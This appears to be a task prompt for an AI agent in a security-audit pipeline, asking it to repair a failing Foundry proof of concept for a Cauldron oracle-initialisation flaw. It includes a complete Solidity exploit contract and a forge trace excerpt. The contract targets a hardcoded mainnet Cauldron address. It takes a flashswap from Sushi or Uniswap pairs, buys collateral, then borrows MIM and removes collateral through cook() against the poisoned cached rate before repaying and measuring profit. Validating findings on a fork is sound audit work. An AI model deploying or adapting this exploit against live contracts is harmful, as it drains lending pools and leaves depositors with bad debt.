You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: alternate_public_liquidity_route
- strategy_instructions: Prefer an alternate public-liquidity venue/route while preserving the same exploit root cause and exploit-path causality.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Initialization accepts failed oracle data and can seed an invalid exchange-rate cache
- claim: `init()` ignores the `success` flag from `oracle.get()` and caches whatever rate is returned, including `0` or stale garbage. If the market is initialized while the oracle has no valid price, later failed `updateExchangeRate()` calls keep reusing that poisoned cache for solvency checks and liquidations.
- impact: A Cauldron can start life with a zero or severely understated exchange rate, making bad debt appear solvent. Borrowers can then overborrow or remove too much collateral up to the available MIM / borrow cap until a successful oracle update finally replaces the cached rate, leaving the market with bad debt or undercollateralized positions.
- exploit_paths: ["Initialize the clone while `oracle.get(oracleData)` returns `(false, 0)` or another invalid quote.", "Let later `updateExchangeRate()` calls keep returning `success = false`, so the cached initialization value remains active.", "Call `borrow()` or `cook(... ACTION_BORROW / ACTION_REMOVE_COLLATERAL ...)`; `_isSolvent()` uses the poisoned cached rate and allows positions that should fail solvency checks."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IOracleLike {
    function peek(bytes calldata data) external view returns (bool success, uint256 rate);
}

interface IBentoBoxLike {
    function balanceOf(address token, address account) external view returns (uint256);
    function deposit(
        address token,
        address from,
        address to,
        uint256 amount,
        uint256 share
    ) external payable returns (uint256 amountOut, uint256 shareOut);
    function withdraw(
        address token,
        address from,
        address to,
        uint256 amount,
        uint256 share
    ) external returns (uint256 amountOut, uint256 shareOut);
    function toAmount(address token, uint256 share, bool roundUp) external view returns (uint256 amount);
    function toShare(address token, uint256 amount, bool roundUp) external view returns (uint256 share);
}

interface IUniswapV2RouterLike {
    function getAmountsOut(uint256 amountIn, address[] calldata path) external view returns (uint256[] memory amounts);
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface ICauldronV4Like {
    function collateral() external view returns (address);
    function oracle() external view returns (address);
    function oracleData() external view returns (bytes memory);
    function bentoBox() external view returns (address);
    function magicInternetMoney() external view returns (address);
    function exchangeRate() external view returns (uint256);
    function COLLATERIZATION_RATE() external view returns (uint256);
    function borrowLimit() external view returns (uint128 total, uint128 borrowPartPerAddress);
    function totalBorrow() external view returns (uint128 elastic, uint128 base);
    function BORROW_OPENING_FEE() external view returns (uint256);
    function userBorrowPart(address user) external view returns (uint256);
    function updateExchangeRate() external returns (bool updated, uint256 rate);
    function cook(
        uint8[] calldata actions,
        uint256[] calldata values,
        bytes[] calldata datas
    ) external payable returns (uint256 value1, uint256 value2);
}

contract FlawVerifier {
    address public constant TARGET = 0x7259e152103756e1616A77Ae982353c3751A6a90;

    address internal constant SUSHI_ROUTER = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;
    address internal constant SUSHI_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
    address internal constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address internal constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;

    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    uint8 internal constant ACTION_REMOVE_COLLATERAL = 4;
    uint8 internal constant ACTION_BORROW = 5;
    uint8 internal constant ACTION_ADD_COLLATERAL = 10;

    uint256 internal constant BORROW_OPENING_FEE_PRECISION = 1e5;
    uint256 internal constant COLLATERIZATION_RATE_PRECISION = 1e5;
    uint256 internal constant EXCHANGE_RATE_PRECISION = 1e18;
    uint256 internal constant FLASH_FEE_NUMERATOR = 1000;
    uint256 internal constant FLASH_FEE_DENOMINATOR = 997;

    address private _profitToken;
    uint256 private _profitAmount;
    bool private _executed;
    bool private _hypothesisValidated;
    string private _pathUsed;

    uint256 private _startingProfitBalance;
    address private _activePair;
    bool private _flashswapInFlight;

    struct SearchConfig {
        ICauldronV4Like cauldron;
        uint256 poisonedRate;
        address collateralToken;
        address mim;
        uint256 borrowCap;
    }

    constructor() {}

    function executeOnOpportunity() external {
        if (_executed) {
            return;
        }
        _executed = true;

        ICauldronV4Like cauldron = ICauldronV4Like(TARGET);
        address mim = cauldron.magicInternetMoney();
        _profitToken = mim;
        _startingProfitBalance = IERC20Like(mim).balanceOf(address(this));

        address collateralToken = cauldron.collateral();
        if (collateralToken == address(0)) {
            _pathUsed = "infeasible_uninitialized_target";
            return;
        }

        bytes memory oracleData = cauldron.oracleData();
        (bool updated, uint256 poisonedRate) = _tryUpdateExchangeRate(cauldron);
        if (updated) {
            _pathUsed = "infeasible_oracle_updates_successfully";
            _finalize(mim);
            return;
        }
        if (poisonedRate == 0) {
            poisonedRate = cauldron.exchangeRate();
        }

        // The root cause remains unchanged:
        // 1. init() accepted oracle.get() data even when success=false and cached that rate.
        // 2. updateExchangeRate() still returns success=false, so the cached rate remains authoritative.
        // 3. cook(... ADD_COLLATERAL / BORROW / REMOVE_COLLATERAL ...) uses that poisoned cache in the final solvency check.
        {
            bool peekSuccess;
            uint256 peekRate;
            try IOracleLike(cauldron.oracle()).peek(oracleData) returns (bool success, uint256 rate) {
                peekSuccess = success;
                peekRate = rate;
            } catch {}

            if (peekSuccess && peekRate != 0 && poisonedRate >= peekRate) {
                _pathUsed = "infeasible_cached_rate_not_understated";
                _finalize(mim);
                return;
            }
        }

        address bento = cauldron.bentoBox();
        uint256 availableMimShare = IBentoBoxLike(bento).balanceOf(mim, TARGET);
        uint256 availableMimAmount = IBentoBoxLike(bento).toAmount(mim, availableMimShare, false);
        uint256 borrowCap = _maxBorrowable(cauldron, availableMimAmount);
        if (borrowCap > 1) {
            uint256 haircut = (borrowCap / 1000) + 1;
            borrowCap = haircut < borrowCap ? borrowCap - haircut : 0;
        }
        if (borrowCap == 0) {
            _pathUsed = "infeasible_no_borrow_capacity";
            _finalize(mim);
            return;
        }
        _runFlashswap(cauldron, poisonedRate, collateralToken, mim, borrowCap);
        _finalize(mim);
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        require(_flashswapInFlight, "flash not expected");
        require(msg.sender == _activePair, "bad pair");
        require(sender == address(this), "bad sender");

        ICauldronV4Like cauldron = ICauldronV4Like(TARGET);
        address mim = cauldron.magicInternetMoney();
        address collateralToken = cauldron.collateral();
        uint256 flashAmount = amount0 != 0 ? amount0 : amount1;

        (address router, address[] memory path, uint256 borrowAmount) = abi.decode(data, (address, address[], uint256));
        require(flashAmount != 0, "no flash amount");

        uint256 collateralAmount = flashAmount;
        if (collateralToken != mim) {
            require(path.length >= 2, "bad path");
            require(path[0] == mim && path[path.length - 1] == collateralToken, "wrong route");
            _forceApprove(mim, router, flashAmount);
            uint256 beforeCollateral = IERC20Like(collateralToken).balanceOf(address(this));
            IUniswapV2RouterLike(router).swapExactTokensForTokens(flashAmount, 1, path, address(this), block.timestamp);
            collateralAmount = IERC20Like(collateralToken).balanceOf(address(this)) - beforeCollateral;
        }
        require(collateralAmount != 0, "no collateral bought");

        uint256 removedShare = _depositAndCook(cauldron, collateralToken, collateralAmount, borrowAmount);
        _withdrawAllMim(cauldron.bentoBox(), mim);

        if (removedShare != 0) {
            IBentoBoxLike(cauldron.bentoBox()).withdraw(collateralToken, address(this), address(this), 0, removedShare);
            if (collateralToken != mim) {
                _swapAll(router, _reversePath(path));
            }
        }

        uint256 repayAmount = _flashRepayAmount(flashAmount);
        require(IERC20Like(mim).balanceOf(address(this)) >= repayAmount, "insufficient flash repay");
        _safeTransfer(mim, msg.sender, repayAmount);

        _hypothesisValidated = true;
        _pathUsed = "oracle_get_false_cached_rate_then_cook_add_collateral_borrow_remove_collateral";
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function hypothesisValidated() external view returns (bool) {
        return _hypothesisValidated;
    }

    function pathUsed() external view returns (string memory) {
        return _pathUsed;
    }

    function _depositAndCook(
        ICauldronV4Like cauldron,
        address collateralToken,
        uint256 collateralAmount,
        uint256 borrowAmount
    ) internal returns (uint256 removedShare) {
        address bento = cauldron.bentoBox();

        _forceApprove(collateralToken, bento, collateralAmount);
        (, uint256 shareOut) = IBentoBoxLike(bento).deposit(collateralToken, address(this), TARGET, collateralAmount, 0);
        require(shareOut != 0, "no collateral share");

        uint256 keepShare = _requiredKeepShareForBorrow(cauldron, cauldron.exchangeRate(), borrowAmount);
        require(shareOut > keepShare, "no removable share");
        removedShare = shareOut - keepShare;

        uint8[] memory actions = new uint8[](3);
        actions[0] = ACTION_ADD_COLLATERAL;
        actions[1] = ACTION_BORROW;
        actions[2] = ACTION_REMOVE_COLLATERAL;

        uint256[] memory values = new uint256[](3);

        bytes[] memory datas = new bytes[](3);
        datas[0] = abi.encode(_toInt256(shareOut), address(this), true);
        datas[1] = abi.encode(_toInt256(borrowAmount), address(this));
        datas[2] = abi.encode(_toInt256(removedShare), address(this));

        // Flashswap funding is only a realistic way to source temporary seed collateral.
        // The exploit causality itself is unchanged: borrow/remove passes because updateExchangeRate()
        // reuses the invalid init-time cache when oracle.get() keeps returning success=false.
        cauldron.cook(actions, values, datas);
    }

    function _runFlashswap(
        ICauldronV4Like cauldron,
        uint256 poisonedRate,
        address collateralToken,
        address mim,
        uint256 borrowCap
    ) internal {
        (address flashPair, address router, address[] memory path, uint256 seedMimAmount, uint256 borrowAmount) =
            _findFlashswapPlan(cauldron, poisonedRate, collateralToken, mim, borrowCap);

        if (flashPair == address(0) || seedMimAmount == 0 || borrowAmount == 0) {
            _pathUsed = "infeasible_no_flashswap_plan";
            return;
        }

        _activePair = flashPair;
        _flashswapInFlight = true;

        address token0 = IUniswapV2PairLike(flashPair).token0();
        uint256 amount0Out = token0 == mim ? seedMimAmount : 0;
        uint256 amount1Out = token0 == mim ? 0 : seedMimAmount;

        try
            IUniswapV2PairLike(flashPair).swap(
                amount0Out,
                amount1Out,
                address(this),
                abi.encode(router, path, borrowAmount)
            )
        {} catch {
            if (!_hypothesisValidated) {
                _pathUsed = "infeasible_flashswap_execution_reverted";
            }
        }

        _flashswapInFlight = false;
        _activePair = address(0);
    }

    function _findFlashswapPlan(
        ICauldronV4Like cauldron,
        uint256 poisonedRate,
        address collateralToken,
        address mim,
        uint256 borrowCap
    )
        internal
        view
        returns (address flashPair, address router, address[] memory path, uint256 seedMimAmount, uint256 borrowAmount)
    {
        if (collateralToken == mim) {
            (flashPair, seedMimAmount, borrowAmount) = _findSameTokenPlan(cauldron, poisonedRate, mim, borrowCap);
            router = address(0);
            path = _emptyPath();
            return (flashPair, router, path, seedMimAmount, borrowAmount);
        }
        return _findFlashswapPlanOtherToken(cauldron, poisonedRate, collateralToken, mim, borrowCap);
    }

    function _findSameTokenPlan(
        ICauldronV4Like cauldron,
        uint256 poisonedRate,
        address mim,
        uint256 borrowCap
    )
        internal
        view
        returns (address flashPair, uint256 seedMimAmount, uint256 borrowAmount)
    {
        uint256[16] memory probes = [
            uint256(1e17),
            2e17,
            5e17,
            1e18,
            2e18,
            5e18,
            10e18,
            20e18,
            50e18,
            100e18,
            200e18,
            500e18,
            1_000e18,
            2_000e18,
            5_000e18,
            10_000e18
        ];

        for (uint256 p = 0; p < probes.length; p++) {
            uint256 probe = probes[p];
            uint256 repay = _flashRepayAmount(probe);
            uint256 shareOut = _safeToShare(cauldron.bentoBox(), mim, probe);
            uint256 borrowSupported = _maxBorrowSupportedByShare(cauldron, poisonedRate, shareOut, borrowCap);
            uint256 keepShare = _requiredKeepShareForBorrow(cauldron, poisonedRate, borrowSupported);
            if (borrowSupported <= repay || shareOut <= keepShare) {
                continue;
            }

            flashPair = _findAnyFlashPair(mim, probe);
            if (flashPair != address(0)) {
                seedMimAmount = probe;
                borrowAmount = borrowSupported;
                return (flashPair, seedMimAmount, borrowAmount);
            }
        }
    }

    function _findFlashswapPlanOtherToken(
        ICauldronV4Like cauldron,
        uint256 poisonedRate,
        address collateralToken,
        address mim,
        uint256 borrowCap
    )
        internal
        view
        returns (address flashPair, address router, address[] memory path, uint256 seedMimAmount, uint256 borrowAmount)
    {
        SearchConfig memory cfg = SearchConfig({
            cauldron: cauldron,
            poisonedRate: poisonedRate,
            collateralToken: collateralToken,
            mim: mim,
            borrowCap: borrowCap
        });
        uint256[16] memory probes = [
            uint256(1e17),
            2e17,
            5e17,
            1e18,
            2e18,
            5e18,
            10e18,
            20e18,
            50e18,
            100e18,
            200e18,
            500e18,
            1_000e18,
            2_000e18,
            5_000e18,
            10_000e18
        ];

        for (uint256 p = 0; p < probes.length; p++) {
            uint256 probe = probes[p];
            uint256 repay = _flashRepayAmount(probe);
            (flashPair, path, borrowAmount) =
                _tryCandidate(cfg, SUSHI_ROUTER, UNISWAP_V2_FACTORY, address(0), probe, repay);
            if (flashPair != address(0)) {
                router = SUSHI_ROUTER;
                seedMimAmount = probe;
                return (flashPair, router, path, seedMimAmount, borrowAmount);
            }

            (flashPair, path, borrowAmount) =
                _tryCandidate(cfg, UNISWAP_V2_ROUTER, SUSHI_FACTORY, address(0), probe, repay);
            if (flashPair != address(0)) {
                router = UNISWAP_V2_ROUTER;
                seedMimAmount = probe;
                return (flashPair, router, path, seedMimAmount, borrowAmount);
            }

            if (collateralToken != WETH) {
                (flashPair, path, borrowAmount) = _tryCandidate(cfg, SUSHI_ROUTER, UNISWAP_V2_FACTORY, WETH, probe, repay);
                if (flashPair != address(0)) {
                    router = SUSHI_ROUTER;
                    seedMimAmount = probe;
                    return (flashPair, router, path, seedMimAmount, borrowAmount);
                }

                (flashPair, path, borrowAmount) =
                    _tryCandidate(cfg, UNISWAP_V2_ROUTER, SUSHI_FACTORY, WETH, probe, repay);
                if (flashPair != address(0)) {
                    router = UNISWAP_V2_ROUTER;
                    seedMimAmount = probe;
                    return (flashPair, router, path, seedMimAmount, borrowAmount);
                }
            }

            if (collateralToken != USDC) {
                (flashPair, path, borrowAmount) = _tryCandidate(cfg, SUSHI_ROUTER, UNISWAP_V2_FACTORY, USDC, probe, repay);
                if (flashPair != address(0)) {
                    router = SUSHI_ROUTER;
                    seedMimAmount = probe;
                    return (flashPair, router, path, seedMimAmount, borrowAmount);
                }

                (flashPair, path, borrowAmount) =
                    _tryCandidate(cfg, UNISWAP_V2_ROUTER, SUSHI_FACTORY, USDC, probe, repay);
                if (flashPair != address(0)) {
                    router = UNISWAP_V2_ROUTER;
                    seedMimAmount = probe;
                    return (flashPair, router, path, seedMimAmount, borrowAmount);
                }
            }

            if (collateralToken != USDT) {
                (flashPair, path, borrowAmount) = _tryCandidate(cfg, SUSHI_ROUTER, UNISWAP_V2_FACTORY, USDT, probe, repay);
                if (flashPair != address(0)) {
                    router = SUSHI_ROUTER;
                    seedMimAmount = probe;
                    return (flashPair, router, path, seedMimAmount, borrowAmount);
                }

                (flashPair, path, borrowAmount) =
                    _tryCandidate(cfg, UNISWAP_V2_ROUTER, SUSHI_FACTORY, USDT, probe, repay);
                if (flashPair != address(0)) {
                    router = UNISWAP_V2_ROUTER;
                    seedMimAmount = probe;
                    return (flashPair, router, path, seedMimAmount, borrowAmount);
                }
            }

            if (collateralToken != DAI) {
                (flashPair, path, borrowAmount) = _tryCandidate(cfg, SUSHI_ROUTER, UNISWAP_V2_FACTORY, DAI, probe, repay);
                if (flashPair != address(0)) {
                    router = SUSHI_ROUTER;
                    seedMimAmount = probe;
                    return (flashPair, router, path, seedMimAmount, borrowAmount);
                }

                (flashPair, path, borrowAmount) =
                    _tryCandidate(cfg, UNISWAP_V2_ROUTER, SUSHI_FACTORY, DAI, probe, repay);
                if (flashPair != address(0)) {
                    router = UNISWAP_V2_ROUTER;
                    seedMimAmount = probe;
                    return (flashPair, router, path, seedMimAmount, borrowAmount);
                }
            }
        }
    }

    function _tryCandidate(
        SearchConfig memory cfg,
        address routeRouter,
        address flashFactory,
        address mid,
        uint256 probe,
        uint256 repay
    ) internal view returns (address flashPair, address[] memory path, uint256 borrowSupported) {
        if (mid == address(0)) {
            path = _path2(cfg.mim, cfg.collateralToken);
        } else {
            path = _path3(cfg.mim, mid, cfg.collateralToken);
        }
        (flashPair, borrowSupported) = _candidateFromCrossDexRoute(cfg, routeRouter, flashFactory, path, probe, repay);
    }

    function _candidateFromCrossDexRoute(
        SearchConfig memory cfg,
        address routeRouter,
        address flashFactory,
        address[] memory candidatePath,
        uint256 probe,
        uint256 repay
    ) internal view returns (address flashPair, uint256 borrowSupported) {
        (, uint256 shareOut) = _quoteRoute(cfg.cauldron.bentoBox(), cfg.collateralToken, routeRouter, candidatePath, probe);
        if (shareOut == 0) {
            return (address(0), 0);
        }

        borrowSupported = _maxBorrowSupportedByShare(cfg.cauldron, cfg.poisonedRate, shareOut, cfg.borrowCap);
        uint256 keepShare = _requiredKeepShareForBorrow(cfg.cauldron, cfg.poisonedRate, borrowSupported);
        if (borrowSupported <= repay || shareOut <= keepShare) {
            return (address(0), 0);
        }

        flashPair = _findFlashPairOnFactory(flashFactory, cfg.mim, probe);
    }

    function _findFlashPairOnFactory(
        address flashFactory,
        address mim,
        uint256 minMimLiquidity
    ) internal view returns (address flashPair) {
        for (uint256 m = 0; m < 4; m++) {
            address pair = IUniswapV2FactoryLike(flashFactory).getPair(mim, _midAt(m));
            if (pair == address(0)) {
                continue;
            }
            if (_mimReserve(pair, mim) <= minMimLiquidity) {
                continue;
            }
            return pair;
        }
    }

    function _findAnyFlashPair(address mim, uint256 minMimLiquidity) internal view returns (address flashPair) {
        flashPair = _findFlashPairOnFactory(SUSHI_FACTORY, mim, minMimLiquidity);
        if (flashPair == address(0)) {
            flashPair = _findFlashPairOnFactory(UNISWAP_V2_FACTORY, mim, minMimLiquidity);
        }
    }

    function _routePair0(address factory, address[] memory path) internal view returns (address) {
        if (path.length < 2 || factory == address(0)) {
            return address(0);
        }
        return IUniswapV2FactoryLike(factory).getPair(path[0], path[1]);
    }

    function _routerAt(uint256 index) internal pure returns (address) {
        if (index == 0) {
            return SUSHI_ROUTER;
        }
        return UNISWAP_V2_ROUTER;
    }

    function _factoryAt(uint256 index) internal pure returns (address) {
        if (index == 0) {
            return SUSHI_FACTORY;
        }
        return UNISWAP_V2_FACTORY;
    }

    function _midAt(uint256 index) internal pure returns (address) {
        if (index == 0) {
            return WETH;
        }
        if (index == 1) {
            return USDC;
        }
        if (index == 2) {
            return USDT;
        }
        return DAI;
    }

    function _quoteRoute(
        address bento,
        address collateralToken,
        address router,
        address[] memory path,
        uint256 amountIn
    ) internal view returns (uint256 amountOut, uint256 shareOut) {
        try IUniswapV2RouterLike(router).getAmountsOut(amountIn, path) returns (uint256[] memory amounts) {
            if (amounts.length == 0) {
                return (0, 0);
            }
            amountOut = amounts[amounts.length - 1];
            if (amountOut == 0) {
                return (0, 0);
            }
            shareOut = _safeToShare(bento, collateralToken, amountOut);
        } catch {}
    }

    function _maxBorrowSupportedByShare(
        ICauldronV4Like cauldron,
        uint256 poisonedRate,
        uint256 collateralShare,
        uint256 borrowCap
    ) internal view returns (uint256) {
        if (collateralShare == 0 || borrowCap == 0) {
            return 0;
        }

        uint256 lo;
        uint256 hi = borrowCap;

        while (lo < hi) {
            uint256 mid = (lo + hi + 1) >> 1;
            uint256 keepShare = _requiredKeepShareForBorrow(cauldron, poisonedRate, mid);
            if (keepShare < collateralShare) {
                lo = mid;
            } else {
                hi = mid - 1;
            }
        }

        return lo;
    }

    function _requiredKeepShareForBorrow(
        ICauldronV4Like cauldron,
        uint256 poisonedRate,
        uint256 borrowAmount
    ) internal view returns (uint256) {
        if (borrowAmount == 0) {
            return 0;
        }

        (uint128 totalElastic, uint128 totalBase) = cauldron.totalBorrow();
        uint256 borrowFee = cauldron.BORROW_OPENING_FEE();
        uint256 borrowElastic = borrowAmount + ((borrowAmount * borrowFee) / BORROW_OPENING_FEE_PRECISION);

        uint256 part;
        uint256 newElastic;
        uint256 newBase;

        if (totalBase == 0) {
            part = borrowElastic;
            newElastic = borrowElastic;
            newBase = borrowElastic;
        } else {
            part = (borrowElastic * uint256(totalBase)) / uint256(totalElastic);
            if ((part * uint256(totalElastic)) / uint256(totalBase) < borrowElastic) {
                part += 1;
            }
            newElastic = uint256(totalElastic) + borrowElastic;
            newBase = uint256(totalBase) + part;
        }

        uint256 rhsCollateralAmount = (part * newElastic * poisonedRate) / newBase;
        if (rhsCollateralAmount == 0) {
            return 0;
        }

        uint256 scaledShareNeeded = _safeToShare(cauldron.bentoBox(), cauldron.collateral(), rhsCollateralAmount);
        if (scaledShareNeeded == 0 && rhsCollateralAmount != 0) {
            scaledShareNeeded = _safeToShare(cauldron.bentoBox(), cauldron.collateral(), rhsCollateralAmount + 1);
        }

        uint256 scale = 1e13 * cauldron.COLLATERIZATION_RATE();
        if (scaledShareNeeded == 0 || scale == 0) {
            return type(uint256).max;
        }

        uint256 keepShare = scaledShareNeeded / scale;
        if (keepShare * scale < scaledShareNeeded) {
            keepShare += 1;
        }
        return keepShare;
    }

    function _mimReserve(address pair, address mim) internal view returns (uint256) {
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
        return IUniswapV2PairLike(pair).token0() == mim ? uint256(reserve0) : uint256(reserve1);
    }

    function _tryUpdateExchangeRate(ICauldronV4Like cauldron) internal returns (bool updated, uint256 rate) {
        try cauldron.updateExchangeRate() returns (bool didUpdate, uint256 newRate) {
            updated = didUpdate;
            rate = newRate;
        } catch {
            updated = true;
        }
    }

    function _withdrawAllMim(address bento, address mim) internal {
        uint256 mimShare = IBentoBoxLike(bento).balanceOf(mim, address(this));
        if (mimShare != 0) {
            IBentoBoxLike(bento).withdraw(mim, address(this), address(this), 0, mimShare);
        }
    }

    function _swapAll(address router, address[] memory path) internal {
        if (router == address(0) || path.length < 2) {
            return;
        }

        uint256 amountIn = IERC20Like(path[0]).balanceOf(address(this));
        if (amountIn == 0) {
            return;
        }

        _forceApprove(path[0], router, amountIn);
        IUniswapV2RouterLike(router).swapExactTokensForTokens(amountIn, 1, path, address(this), block.timestamp);
    }

    function _maxBorrowable(ICauldronV4Like cauldron, uint256 availableMimAmount) internal view returns (uint256) {
        (uint128 capTotal, uint128 capPerAddress) = cauldron.borrowLimit();
        (uint128 totalElastic, uint128 totalBase) = cauldron.totalBorrow();
        uint256 userBorrowPart = cauldron.userBorrowPart(address(this));
        uint256 borrowFee = cauldron.BORROW_OPENING_FEE();

        uint256 hi = availableMimAmount;
        uint256 lo;

        while (lo < hi) {
            uint256 mid = (lo + hi + 1) >> 1;
            uint256 feeAmount = (mid * borrowFee) / BORROW_OPENING_FEE_PRECISION;
            uint256 borrowElastic = mid + feeAmount;
            uint256 newElastic = uint256(totalElastic) + borrowElastic;

            if (newElastic > uint256(capTotal)) {
                hi = mid - 1;
                continue;
            }

            uint256 part;
            if (totalBase == 0) {
                part = borrowElastic;
            } else {
                part = (borrowElastic * uint256(totalBase)) / uint256(totalElastic);
                if ((part * uint256(totalElastic)) / uint256(totalBase) < borrowElastic) {
                    part += 1;
                }
            }

            if (userBorrowPart + part > uint256(capPerAddress)) {
                hi = mid - 1;
                continue;
            }

            lo = mid;
        }

        return lo;
    }

    function _flashRepayAmount(uint256 amountOut) internal pure returns (uint256) {
        return ((amountOut * FLASH_FEE_NUMERATOR) / FLASH_FEE_DENOMINATOR) + 1;
    }

    function _toInt256(uint256 value) internal pure returns (int256) {
        require(value <= uint256(type(int256).max), "int overflow");
        // forge-lint: disable-next-line(unsafe-typecast)
        return int256(value);
    }

    function _safeToShare(address bento, address token, uint256 amount) internal view returns (uint256 shareOut) {
        try IBentoBoxLike(bento).toShare(token, amount, true) returns (uint256 share) {
            shareOut = share;
        } catch {}
    }

    function _reversePath(address[] memory path) internal pure returns (address[] memory reversed) {
        reversed = new address[](path.length);
        for (uint256 i = 0; i < path.length; i++) {
            reversed[i] = path[path.length - 1 - i];
        }
    }

    function _path2(address a, address b) internal pure returns (address[] memory path) {
        path = new address[](2);
        path[0] = a;
        path[1] = b;
    }

    function _path3(address a, address b, address c) internal pure returns (address[] memory path) {
        path = new address[](3);
        path[0] = a;
        path[1] = b;
        path[2] = c;
    }

    function _emptyPath() internal pure returns (address[] memory path) {
        path = new address[](0);
    }

    function _finalize(address mim) internal {
        uint256 ending = IERC20Like(mim).balanceOf(address(this));
        if (ending > _startingProfitBalance) {
            _profitAmount = ending - _startingProfitBalance;
        }
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        uint256 allowance = IERC20Like(token).allowance(address(this), spender);
        if (allowance >= amount) {
            return;
        }

        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0));
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, type(uint256).max));
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
    }

    function _callOptionalReturn(address token, bytes memory data) internal {
        (bool success, bytes memory returnData) = token.call(data);
        require(success, "token call failed");
        if (returnData.length != 0) {
            require(abi.decode(returnData, (bool)), "token op failed");
        }
    }
}

```

forge stdout (tail):
```
─ [2581] 0x7259e152103756e1616A77Ae982353c3751A6a90::collateral() [staticcall]
    │   │   ├─ [2415] 0xC4113Ae18E0d3213c6a06947a2fFC70AD3517c77::collateral() [delegatecall]
    │   │   │   └─ ← [Return] 0x8078198Fc424986ae89Ce4a910Fc109587b6aBF3
    │   │   └─ ← [Return] 0x8078198Fc424986ae89Ce4a910Fc109587b6aBF3
    │   ├─ [3249] 0x7259e152103756e1616A77Ae982353c3751A6a90::oracleData() [staticcall]
    │   │   ├─ [3077] 0xC4113Ae18E0d3213c6a06947a2fFC70AD3517c77::oracleData() [delegatecall]
    │   │   │   └─ ← [Return] 0x
    │   │   └─ ← [Return] 0x
    │   ├─ [124080] 0x7259e152103756e1616A77Ae982353c3751A6a90::updateExchangeRate()
    │   │   ├─ [123908] 0xC4113Ae18E0d3213c6a06947a2fFC70AD3517c77::updateExchangeRate() [delegatecall]
    │   │   │   ├─ [112035] 0xbe9B99d4Dc860ac6FB97E56102815a8F973967C6::d6d7d525(00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000)
    │   │   │   │   ├─ [106247] 0xb80ddE125aF28F3b124d6fA1ff11FAd5967940Ee::d6d7d525(00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000)
    │   │   │   │   │   ├─ [19222] 0x8078198Fc424986ae89Ce4a910Fc109587b6aBF3::99530b06() [staticcall]
    │   │   │   │   │   │   ├─ [16556] 0xfA6ebB3a62Dde486f87661D238B53BF6557d386A::99530b06() [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000f00f75c75885421
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000f00f75c75885421
    │   │   │   │   │   ├─ [80626] 0xAba04e7fe37fc3808d601DE4d65690E2889d7621::54f0f7d5() [staticcall]
    │   │   │   │   │   │   ├─ [3676] 0xD51a44d3FaE010294C616388b506AcdA1bfAAE46::0c46b72a() [staticcall]
    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000e7012d086537a36
    │   │   │   │   │   │   ├─ [14620] 0xF4030086522a5bEEa4988F8cA5B36dbC97BeE88c::50d25bcd() [staticcall]
    │   │   │   │   │   │   │   ├─ [7124] 0xdBe1941BFbe4410D6865b9b7078e0b49af144D2d::50d25bcd() [staticcall]
    │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000003f10721927b
    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000003f10721927b
    │   │   │   │   │   │   ├─ [14620] 0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419::50d25bcd() [staticcall]
